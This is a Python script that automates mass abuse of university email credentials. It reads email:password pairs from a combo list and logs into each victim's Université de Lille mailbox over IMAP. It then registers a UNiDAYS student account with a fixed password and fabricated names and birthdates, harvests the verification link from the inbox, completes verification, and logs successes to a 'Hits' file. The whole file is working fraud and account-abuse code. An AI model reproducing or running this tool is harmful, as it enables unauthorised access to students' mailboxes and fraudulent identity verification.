import requests
import imaplib
import email
import random
from email.header import decode_header
from datetime import datetime
import time
import re
import sys

# Function to print in green
def print_green(message):
    print(f"\033[92m{message}\033[0m")

# Function to print in red
def print_red(message):
    print(f"\033[91m{message}\033[0m")

def extract_username(email_address):
    return email_address.split('@')[0]

def check_existing_unidays_email(session, edu_mail, email_password):
    imap_server = "imap.univ-lille.fr"
    imap_port = 993
    username = extract_username(edu_mail)
    try:
        mail = imaplib.IMAP4_SSL(imap_server, imap_port)
        mail.login(username, email_password)
        mail.select("inbox")
        status, messages = mail.search(None, '(FROM "myunidays.com")')
        mail.logout()
        return bool(messages[0])
    except imaplib.IMAP4.error as e:
        print_red(f"IMAP error checking email: {e}")
        return 'Login Failed'
    except Exception as e:
        print_red(f"Error checking email: {e}")
        return False

def register_unidays(session, edu_mail):
    url = "https://account.myunidays.com/FR/fr-FR/account/register"
    payload = {
        "MxCheckFailureOccurred": "false",
        "EmailAddress": edu_mail,
        "ConfirmEmailAddress": edu_mail,
        "Password": "Nagui.06",
        "ConfirmPassword": "Nagui.06",
        "Human": "",
        "QueuedPath": "/FR/fr-FR",
        "CheckAdditionalTermsAcceptance": "False",
        "TermsAgreementMode": "SplitAgree",
        "AgreeToTerms": "TRUE"
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.myunidays.com",
        "referer": "https://www.myunidays.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "ud-source": "www",
        "ud-style": "default,default,account",
        "ud-validationsubmit": "true",
        "ud-viewport": "8"
    }
    try:
        response = session.post(url, data=payload, headers=headers)
        return response.status_code, response.text
    except Exception as e:
        print_red(f"Error registering: {e}")
        return None, str(e)

def set_wayf_details_unidays(session):
    url = "https://account.myunidays.com/FR/fr-FR/account/set-wayf-details"
    first_name = random.choice(["Marc", "Pierre", "Jean", "Luc", "Alain", "Leo"])
    last_name = random.choice(["Ohlala", "Dupont", "Martin", "Bernard", "Moreau", "Banitou"])
    sex = random.choice(["Male", "Female"])
    birth_date = datetime(
        random.randint(1980, 2005),
        random.randint(1, 12),
        random.randint(1, 28)
    ).strftime("%Y-%m-%d")
    payload = {
        "WayfSeparateScreenEnabled": "False",
        "WithName": "true",
        "FirstName": first_name,
        "LastName": last_name,
        "Sex": sex,
        "CaptureBirthdayEnabled": "True",
        "Birthday": birth_date,
        "ElasticSearchEnabled": "True",
        "InstitutionId": "75e5f189-5c00-42d5-9cc1-69ac1ad36dc9",
        "InstitutionName": "",
        "Human": "",
        "CourseInfoProvided": "False"
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.myunidays.com",
        "referer": "https://www.myunidays.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "ud-source": "www",
        "ud-style": "default,default,account",
        "ud-validationsubmit": "true",
        "ud-viewport": "8"
    }
    try:
        response = session.post(url, data=payload, headers=headers)
        return response.status_code, response.text
    except Exception as e:
        print_red(f"Error setting WAYF details: {e}")
        return None, str(e)

def email_verify_unidays(session, edu_mail):
    url = "https://account.myunidays.com/FR/fr-FR/account/email-verify"
    payload = {
        "MxCheckFailureOccurred": "false",
        "InstitutionId": "75e5f189-5c00-42d5-9cc1-69ac1ad36dc9",
        "QueuedPath": "/FR/fr-FR",
        "Submit": "false",
        "ForceEmailVerifyInstitution": "false",
        "PersonalInstitutionEmailAddress": edu_mail,
        "EmailOptIn": "FALSE",
        "Human": ""
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.myunidays.com",
        "referer": "https://www.myunidays.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "ud-source": "www",
        "ud-style": "default,default,account",
        "ud-validationsubmit": "true",
        "ud-viewport": "8"
    }
    try:
        response = session.post(url, data=payload, headers=headers)
        return response.status_code, response.text
    except Exception as e:
        print_red(f"Error verifying email: {e}")
        return None, str(e)

def get_last_unidays_email_link(edu_mail, email_password):
    imap_server = "imap.univ-lille.fr"
    imap_port = 993
    username = extract_username(edu_mail)
    try:
        mail = imaplib.IMAP4_SSL(imap_server, imap_port)
        mail.login(username, email_password)
        mail.select("inbox")
        status, messages = mail.search(None, '(FROM "@myunidays.com")')
        if status != 'OK':
            mail.logout()
            print_red(f"Search failed with status: {status}")
            return None
        messages = messages[0].split()
        if not messages:
            mail.logout()
            print_red("No emails found.")
            return None
        
        latest_email_id = messages[-1]
        res, msg = mail.fetch(latest_email_id, "(RFC822)")
        for response in msg:
            if isinstance(response, tuple):
                msg = email.message_from_bytes(response[1])
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            payload = part.get_payload(decode=True)
                            if payload:
                                body = payload.decode('utf-8', errors='replace')
                                link = re.search(r'\[https://email\.myunidays\.com/system/clicked-ul[^\]]+\]', body)
                                if link:
                                    mail.logout()
                                    return link.group(0).strip('[]')
                else:
                    payload = msg.get_payload(decode=True)
                    if payload:
                        body = payload.decode('utf-8', errors='replace')
                        link = re.search(r'\[https://email\.myunidays\.com/system/clicked-ul[^\]]+\]', body)
                        if link:
                            mail.logout()
                            return link.group(0).strip('[]')
        mail.logout()
    except Exception as e:
        print_red(f"Error fetching email link: {e}")
    return None

def verify_unidays_account(verification_link):
    session = requests.Session()
    try:
        response = session.get(verification_link, allow_redirects=False)
        location_header = response.headers.get('Location')
        if not location_header:
            return response.status_code, "No Location header found"
        
        match = re.search(r'/v/([a-f0-9\-]+)', location_header)
        if not match:
            return response.status_code, "Verification code not found in Location header"
        
        verification_code = match.group(1)
        complete_url = "https://account.myunidays.com/FR/fr-FR/account/email-verify/complete"
        payload = {
            "verificationId": verification_code,
            "returnUrl": "/FR/fr-FR"
        }
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myunidays.com",
            "referer": "https://www.myunidays.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "ud-source": "www",
            "ud-style": "default,default,account",
            "ud-validationsubmit": "true",
            "ud-viewport": "8"
        }
        response = session.post(complete_url, data=payload, headers=headers)
        return response.status_code, response.text
    except Exception as e:
        print_red(f"Error verifying account: {e}")
        return None, str(e)

def process_email_password_pair(email_pass_pair):
    edu_mail, email_password = email_pass_pair
    session = requests.Session()
    
    print(f"Processing email: {edu_mail}")
    check_result = check_existing_unidays_email(session, edu_mail, email_password)
    if check_result == 'Login Failed':
        print_red("Login failed. Skipping this account.")
        return
    elif check_result:
        print_red("Account already used.")
        return

    print("Registering UNiDAYS account...")
    register_status, register_response = register_unidays(session, edu_mail)
    if register_status != 200:
        print_red(f"Registration failed: {register_response}")
        return
    
    print("Setting WAYF details...")
    wayf_status, wayf_response = set_wayf_details_unidays(session)
    if wayf_status == 403:
        print_red(f"WAYF Details Status: {wayf_status} - {wayf_response}")
        return
    
    print("Verifying email with UNiDAYS...")
    verify_status, verify_response = email_verify_unidays(session, edu_mail)
    if verify_status != 200:
        print_red(f"Email Verification Status: {verify_status} - {verify_response}")
        return

    print(f"Fetching verification email... [DEBUG]: {verify_response}")
    verification_link = None
    for _ in range(10):
        verification_link = get_last_unidays_email_link(edu_mail, email_password)
        if verification_link:
            break
        time.sleep(5)
    
    if verification_link:
        print(f"Verification Link: {verification_link}")
        print("Verifying the UNiDAYS account using the link...")
        final_status, final_response = verify_unidays_account(verification_link)
        if final_status == 200:
            print_green(f"Final Verification Status: {final_status}")
            with open("Hits.txt", "a") as file:
                file.write(f"{edu_mail}:Nagui.06\n")
        else:
            print_red(f"Final Verification Status: {final_status} - {final_response}")
    else:
        print_red("Could not retrieve the verification link.")

def main():
    email_pass_pairs = []
    with open("list.txt", "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            if ':' in line:
                email, password = line.strip().split(':', 1)
                email_pass_pairs.append((email, password))

    for email_pass_pair in email_pass_pairs:
        process_email_password_pair(email_pass_pair)

if __name__ == "__main__":
    main()
